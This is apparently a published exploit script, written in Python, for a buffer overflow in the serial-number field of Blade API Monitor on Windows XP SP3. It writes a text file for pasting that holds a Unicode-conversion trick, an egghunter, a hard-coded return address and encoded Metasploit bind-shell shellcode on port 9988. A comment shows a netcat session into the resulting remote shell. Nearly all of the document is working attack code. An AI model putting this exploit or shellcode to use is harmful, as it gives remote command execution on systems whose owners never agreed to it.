#!/usr/bin/python -w

#---------------------------------------------------------------------------------#
# Exploit: Blade API Monitor Unicode Bypass (Serial Number BOF)                   #
# Author: b33f (Ruben Boonen) - http://www.fuzzysecurity.com                      #
#                               http://www.fuzzysecurity.com/exploits/8.html      #
# OS: WinXP PRO SP3                                                               #
# Software: http://www.exploit-db.com/wp-content/themes/exploit/applications/     #
#           f248239d09b37400e8269cb1347c240e-BladeAPIMonitor-3.6.9.2.Setup.exe    #
#                                                                                 #
# Unicode Exploit by FullMetalFouad - http://www.exploit-db.com/exploits/18349/   #
#---------------------------------------------------------------------------------#
# This is a super strange exploit. First I would like to commend "FullMetalFouad" #
# for the unicode work on the original exploit. Originally I wanted to see if I   #
# could simplify the process. While I was doing that I lost sight of the fact     #
# that the instructions had to be printable since we need to copy them from a     #
# text file. When I opened my POC I saw that all the characters had been          #
# converted to weird blocks (check my site for a screenshot). On a whim I tried   #
# to paste these characters in the serial number field and amazingly the buffer   #
# in the debugger was intact but with one important difference, the unicode had   #
# been converted back to regular ASCII!! Very strange but super fortunate!! If    #
# you want to experiment with the exploit just keep in mind to (1) open it in     #
# windows notepad and (2) that all the characters need to be converted to those   #
# blocks for it to work (depending on your buffer this isn't always the case).    #
#---------------------------------------------------------------------------------#
# root@bt:~# nc -nv 192.168.111.128 9988                                          #
# (UNKNOWN) [192.168.111.128] 9988 (?) open                                       #
# Microsoft Windows XP [Version 5.1.2600]                                         #
# (C) Copyright 1985-2001 Microsoft Corp.                                         #
#                                                                                 #
# C:\Program Files\BladeAPIMonitor>ipconfig                                       #
# ipconfig                                                                        #
#                                                                                 #
# Windows IP Configuration                                                        #
#                                                                                 #
#                                                                                 #
# Ethernet adapter Local Area Connection:                                         #
#                                                                                 #
#        Connection-specific DNS Suffix  . : localdomain                          #
#        IP Address. . . . . . . . . . . . : 192.168.111.128                      #
#        Subnet Mask . . . . . . . . . . . : 255.255.255.0                        #
#        Default Gateway . . . . . . . . . :                                      #
#                                                                                 #
# C:\Program Files\BladeAPIMonitor>                                               #
#---------------------------------------------------------------------------------#

filename="PasteMe.txt"

#---------------------------------------------------------------------------------#
# Originally unicode instructions to put an address in EAX, here it is used to    #
# trigger notepad bug and get UNICODE => ASCII conversion...                      #
#---------------------------------------------------------------------------------#
UniKill = (
"\xB8\x06\xAA\x6F\x50"
"\x6F\x4C\x6F\x58\x6F"
"\x05\x73\x00\x6F\xB0"
"\xB9\xD8\xAA\x6F\xE8")

#Egghunter - Marker b33f
#Size 32-bytes
hunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x62\x33" #b3
"\x33\x66\x8b\xfa" #3f
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

#msfpayload windows/shell_bind_tcp LPORT=9988 R| msfencode -e x86/alpha_mixed -t c
#Size 742-bytes
shellcode = (
"\xd9\xe1\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58"
"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c"
"\x48\x68\x4b\x39\x37\x70\x45\x50\x53\x30\x71\x70\x4f\x79\x69"
"\x75\x34\x71\x79\x42\x53\x54\x4c\x4b\x71\x42\x64\x70\x6c\x4b"
"\x42\x72\x66\x6c\x6c\x4b\x73\x62\x57\x64\x4e\x6b\x73\x42\x36"
"\x48\x36\x6f\x4f\x47\x71\x5a\x44\x66\x56\x51\x49\x6f\x75\x61"
"\x69\x50\x4c\x6c\x45\x6c\x61\x71\x61\x6c\x63\x32\x44\x6c\x47"
"\x50\x49\x51\x6a\x6f\x56\x6d\x55\x51\x49\x57\x4b\x52\x58\x70"
"\x62\x72\x76\x37\x4e\x6b\x56\x32\x34\x50\x6c\x4b\x47\x32\x37"
"\x4c\x73\x31\x5a\x70\x6c\x4b\x61\x50\x62\x58\x4d\x55\x49\x50"
"\x63\x44\x50\x4a\x36\x61\x5a\x70\x50\x50\x6e\x6b\x33\x78\x74"
"\x58\x4c\x4b\x63\x68\x57\x50\x45\x51\x4a\x73\x38\x63\x67\x4c"
"\x42\x69\x4e\x6b\x56\x54\x6c\x4b\x47\x71\x7a\x76\x35\x61\x59"
"\x6f\x56\x51\x49\x50\x6e\x4c\x6b\x71\x4a\x6f\x46\x6d\x67\x71"
"\x48\x47\x46\x58\x59\x70\x62\x55\x4a\x54\x56\x63\x43\x4d\x79"
"\x68\x75\x6b\x73\x4d\x46\x44\x63\x45\x4b\x52\x61\x48\x6e\x6b"
"\x70\x58\x46\x44\x65\x51\x4b\x63\x32\x46\x4c\x4b\x44\x4c\x50"
"\x4b\x4c\x4b\x46\x38\x77\x6c\x65\x51\x6b\x63\x4c\x4b\x76\x64"
"\x6e\x6b\x56\x61\x38\x50\x6e\x69\x32\x64\x76\x44\x44\x64\x71"
"\x4b\x71\x4b\x75\x31\x73\x69\x72\x7a\x72\x71\x59\x6f\x59\x70"
"\x76\x38\x63\x6f\x51\x4a\x4c\x4b\x74\x52\x78\x6b\x4e\x66\x71"
"\x4d\x51\x78\x67\x43\x46\x52\x37\x70\x43\x30\x31\x78\x71\x67"
"\x51\x63\x35\x62\x71\x4f\x76\x34\x42\x48\x50\x4c\x53\x47\x31"
"\x36\x54\x47\x69\x6f\x49\x45\x68\x38\x4e\x70\x37\x71\x67\x70"
"\x35\x50\x37\x59\x7a\x64\x52\x74\x50\x50\x63\x58\x51\x39\x4b"
"\x30\x30\x6b\x75\x50\x39\x6f\x69\x45\x32\x70\x76\x30\x42\x70"
"\x66\x30\x73\x70\x62\x70\x31\x50\x42\x70\x43\x58\x49\x7a\x64"
"\x4f\x4b\x6f\x39\x70\x59\x6f\x5a\x75\x6b\x39\x78\x47\x30\x31"
"\x49\x4b\x62\x73\x33\x58\x74\x42\x43\x30\x65\x77\x53\x34\x4c"
"\x49\x4a\x46\x70\x6a\x44\x50\x46\x36\x56\x37\x63\x58\x79\x52"
"\x39\x4b\x34\x77\x55\x37\x6b\x4f\x38\x55\x62\x73\x76\x37\x53"
"\x58\x6f\x47\x4b\x59\x37\x48\x6b\x4f\x69\x6f\x58\x55\x72\x73"
"\x30\x53\x53\x67\x50\x68\x54\x34\x78\x6c\x65\x6b\x6b\x51\x39"
"\x6f\x6e\x35\x61\x47\x6c\x49\x78\x47\x73\x58\x31\x65\x70\x6e"
"\x30\x4d\x45\x31\x79\x6f\x49\x45\x43\x58\x50\x63\x70\x6d\x43"
"\x54\x67\x70\x4d\x59\x39\x73\x76\x37\x53\x67\x32\x77\x56\x51"
"\x69\x66\x30\x6a\x52\x32\x36\x39\x33\x66\x6a\x42\x6b\x4d\x62"
"\x46\x6b\x77\x30\x44\x34\x64\x35\x6c\x43\x31\x67\x71\x4c\x4d"
"\x50\x44\x74\x64\x32\x30\x6f\x36\x75\x50\x53\x74\x70\x54\x32"
"\x70\x70\x56\x56\x36\x76\x36\x62\x66\x76\x36\x72\x6e\x36\x36"
"\x52\x76\x71\x43\x30\x56\x73\x58\x64\x39\x7a\x6c\x35\x6f\x6c"
"\x46\x59\x6f\x6e\x35\x6b\x39\x59\x70\x70\x4e\x51\x46\x47\x36"
"\x39\x6f\x34\x70\x55\x38\x44\x48\x6c\x47\x37\x6d\x33\x50\x49"
"\x6f\x4a\x75\x6d\x6b\x5a\x50\x6f\x45\x79\x32\x72\x76\x55\x38"
"\x4f\x56\x4d\x45\x4f\x4d\x4f\x6d\x6b\x4f\x69\x45\x47\x4c\x67"
"\x76\x43\x4c\x55\x5a\x6d\x50\x79\x6b\x4d\x30\x51\x65\x33\x35"
"\x4f\x4b\x62\x67\x37\x63\x31\x62\x62\x4f\x53\x5a\x37\x70\x76"
"\x33\x49\x6f\x4b\x65\x41\x41")

#---------------------------------------------------------------------------------#
# (*) Due to the wierd conversion i couldn't do proper badchar analysis           #
# (1) 0x00425e04 : push esp #  ret  | startnull,ascii ==> BladeAPIMonitor.exe     #
# (2) egghunter: We do this because we need more space than we have at ESP        #
# (3) alpha mixed Bindshell port 9988                                             #
#---------------------------------------------------------------------------------#

egg = "\x90"*18 + hunter
evil = "\x90"*10 + "b33f"*2 + shellcode
buffer = UniKill + "A"*560 + "\x04\x5E\x42\x00" + egg + "B"*500 + evil

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()